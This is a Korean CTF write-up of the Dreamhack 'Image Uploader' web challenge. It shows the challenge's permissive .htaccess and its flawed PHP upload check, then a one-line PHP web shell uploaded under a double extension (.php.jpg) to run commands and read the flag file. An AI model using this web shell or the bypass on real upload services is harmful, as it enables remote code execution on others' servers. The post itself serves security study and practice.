---
layout: post
comments: true
sitemap:

title: "[CTF] Dreamhack 문제 풀이: Image Uploader"
excerpt: "RCE 취약점"

date: 2026-02-24
last_modified_at: 2026-02-24

categories: [CTF]
tags: [TIL, WEB, CTF]
---

<!-- markdownlint-disable MD010 MD025 MD033 -->

# Image Uploader

문제: [드림핵 Wargame Web 2 Image Uploader](https://dreamhack.io/wargame/challenges/2624)

## 목차

---

## Vuln

File Upload
RCE(Remote Code Execution)

## Code

### 디렉토리 구조

### .htaccess

<details>
<summary>토글 접기/펼치기</summary>
<div markdown="1">

```apache
# 지정한 확장자들을 MIME 타입 application/x-httpd-php로 취급
AddType application/x-httpd-php .php .phtml .php3 .php4 .php5 .inc

# 디렉터리에 index.html, index.php 같은 인덱스 파일이 없으면 디렉터리 내 파일 목록을 웹에 그대로 보여준다
Options +Indexes

# 모든 파일에 대해 접근 허용
<Files "*">
    Allow from all
</Files>

# .php가 파일명에 포함되면 매칭되어 php 핸들러로 처리
<FilesMatch "\.php">
    SetHandler application/x-httpd-php
</FilesMatch>
```

</div>
</details>

### upload.php

<details>
<summary>토글 접기/펼치기</summary>
<div markdown="1">

```php
<?php
// 세션 시작
session_start();

// 업로드 디렉토리 설정 및 디렉토리 생성
// 디렉토리 권한: root - rwx, 그 외 - rx
$upload_dir = "uploads/";
if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0755, true);
}

// info_file 
$info_file = $upload_dir . "info.json";
$upload_info = [];

if (file_exists($info_file)) {
    $upload_info = json_decode(file_get_contents($info_file), true) ?: [];
}

// POST 방식 && file이 존재할 경우
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    // file
    $file = $_FILES['file'];
    $title = $_POST['title'] ?? '';
    $description = $_POST['description'] ?? '';
    
    // 업로드 에러 발생 시
    if ($file['error'] !== UPLOAD_ERR_OK) {
        die("<script>alert('Error uploading file.'); history.back();</script>");
    }
    
    // 파일 사이즈가 5MB 초과할 경우
    if ($file['size'] > 5 * 1024 * 1024) {
        die("<script>alert('File size too large.'); history.back();</script>");
    }
    
    // 주어진 경로의 기본 이름(파일명) 반환(경로 제거, 이중 확장자 방어 X)
    $filename = basename($file['name']);
    // 파일 확장자 소문자
    $file_extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    
    // 허용된 확장자 (화이트 리스트)
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
    
    $check_extension = $file_extension;
    
    // 파일 정보에서 MIME 추출
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime_type = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);
    
    // 허용된 MIME (화이트 리스트)
    $allowed_mimes = ['image/jpeg', 'image/png', 'image/gif', 'image/jpg'];
    
    // 확장자 && MIME 외 일 경우
    if (!in_array($mime_type, $allowed_mimes) && !in_array($check_extension, $allowed_extensions)) {
        // 에러 방생
        die("<script>alert('Only images allowed.'); history.back();</script>");
    }
    
    // 파일명 변경: 연월일시분초_랜덤숫자(1000~9999)_파일명
    $new_filename = date('YmdHis') . '_' . mt_rand(1000, 9999) . '_' . $filename;
    // 업로드 경로 설정
    $target_path = $upload_dir . $new_filename;
    
    // 업로드된 파일을 새 위치로 이동하기
    if (move_uploaded_file($file['tmp_name'], $target_path)) {
        $upload_info[] = [
            'filename' => $new_filename, // 변경된 파일명
            'original_name' => $filename, // 기존 파일명
            'title' => htmlspecialchars($title), // 제목: 특수문자를 HTML Entity로 변환
            'description' => htmlspecialchars($description), // 설명: 특수문자를 HTML Entity로 변환
            'upload_time' => date('Y-m-d H:i:s'), // 날짜
            'size' => $file['size'], // 파일 크기
            'mime_type' => $mime_type
        ];
        
        // 파일에 데이터 쓰기: json으로 인코딩해서 info_file에
        file_put_contents($info_file, json_encode($upload_info, JSON_PRETTY_PRINT));
        
        // 성공 메시지
        echo "<script>alert('File uploaded successfully!'); location.href='gallery.php';</script>";
    } else {
        // 실패 메시지
        echo "<script>alert('Failed to upload file.'); history.back();</script>";
    }
} else {
    // 경고 알림
    echo "<script>alert('Invalid access.'); location.href='index.php';</script>";
}
?>
```

</div>
</details>

이중확장자 이후 MIME 변경

## Payload

Simple PHP Web shell code

```php
<?php
echo shell_exec($_GET['cmd']);
?>
```

webshell.php → webshell.php.jpg로 변경 후 업로드
![500x212](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-15-51.png)

![500x232](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-15-47.png)

uploads/20260223165901_3516_webshell.php.jpg
![500x208](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-15-43.png)

`ls`
![500x124](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-15-40.png)

`ls ..`
![500x115](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-15-37.png)

`cat ../flag.txt`
![500x101](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-02-24-02-06-21.png)
> flag

## 참고
